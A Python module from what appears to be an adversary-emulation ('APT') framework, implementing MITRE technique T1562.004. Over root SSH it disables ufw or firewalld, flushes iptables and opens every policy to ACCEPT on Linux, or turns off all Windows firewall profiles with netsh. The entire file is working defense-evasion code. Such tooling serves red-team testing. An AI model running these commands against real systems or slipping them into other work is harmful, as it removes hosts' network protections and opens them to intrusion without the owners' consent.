import logging

from modules.base_module import APT_MODULE
from models.target import Target, MESSAGE_TYPE
from models.module_metadata import AttackTactic, TargetOS, TargetArch
from utils.ssh_helper import ssh_exec


class disable_firewall(APT_MODULE):
    name = "Disable Firewall"
    description = (
        "Attempts to disable the host firewall on the target. "
        "On Linux, tries ufw, firewalld, and iptables in order. "
        "On Windows (via OpenSSH), uses netsh advfirewall. "
        "Target OS is detected automatically via uname."
    )
    tactic = AttackTactic.DEFENSE_EVASION
    technique_id = "T1562.004"
    technique_name = "Impair Defenses: Disable or Modify System Firewall"
    compatible_os = [TargetOS.LINUX, TargetOS.WINDOWS]
    compatible_arch = [TargetArch.ANY]

    ssh_user = "root"
    ssh_port = 22
    ssh_key_path = "~/.ssh/id_rsa"

    def __init__(self) -> None:
        super().__init__()

    def action(self, target: Target):
        target.log_activity("Detecting target OS...", True)
        stdout, _, rc = ssh_exec(
            target.ip_label, "uname -s 2>/dev/null || echo UNKNOWN",
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )

        detected_os = stdout.strip().lower()
        logging.log(logging.DEBUG, f"disable_firewall OS detect [{target.ip_label}]: {detected_os!r}")

        if "linux" in detected_os:
            self._disable_linux(target)
        else:
            # uname failed or returned non-Linux – attempt Windows approach
            self._disable_windows(target)

    def _disable_linux(self, target: Target):
        target.log_activity("Linux detected – attempting to disable firewall...", True)

        # Try ufw
        stdout, stderr, rc = ssh_exec(
            target.ip_label, "ufw disable 2>&1",
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )
        combined = (stdout + stderr).lower()
        if rc == 0 and ("disabled" in combined or "stopping" in combined):
            target.log_activity("ufw disabled successfully", True, MESSAGE_TYPE.SUCCESS)
            return

        # Try firewalld
        stdout, stderr, rc = ssh_exec(
            target.ip_label, "systemctl stop firewalld 2>&1 && systemctl disable firewalld 2>&1",
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )
        if rc == 0:
            target.log_activity("firewalld stopped and disabled", True, MESSAGE_TYPE.SUCCESS)
            return

        # Fall back to flushing iptables rules
        stdout, stderr, rc = ssh_exec(
            target.ip_label,
            "iptables -F && iptables -X && iptables -P INPUT ACCEPT "
            "&& iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT",
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )
        if rc == 0:
            target.log_activity("iptables rules flushed – all traffic now accepted",
                                 True, MESSAGE_TYPE.SUCCESS)
        else:
            logging.log(logging.ERROR, f"disable_firewall linux [{target.ip_label}]: {stderr}")
            target.log_activity(
                f"All Linux methods failed: {stderr.strip()}", True, MESSAGE_TYPE.ERROR)

    def _disable_windows(self, target: Target):
        target.log_activity("Attempting Windows firewall disable via netsh...", True)
        stdout, stderr, rc = ssh_exec(
            target.ip_label,
            "netsh advfirewall set allprofiles state off",
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )
        output = (stdout + stderr).strip()
        if rc == 0:
            target.log_activity(
                f"Windows firewall disabled: {output}", True, MESSAGE_TYPE.SUCCESS)
        else:
            logging.log(logging.ERROR, f"disable_firewall windows [{target.ip_label}]: {output}")
            target.log_activity(
                f"netsh failed (rc={rc}): {output}", True, MESSAGE_TYPE.ERROR)

    def enable(self, e):
        self.enabled = e
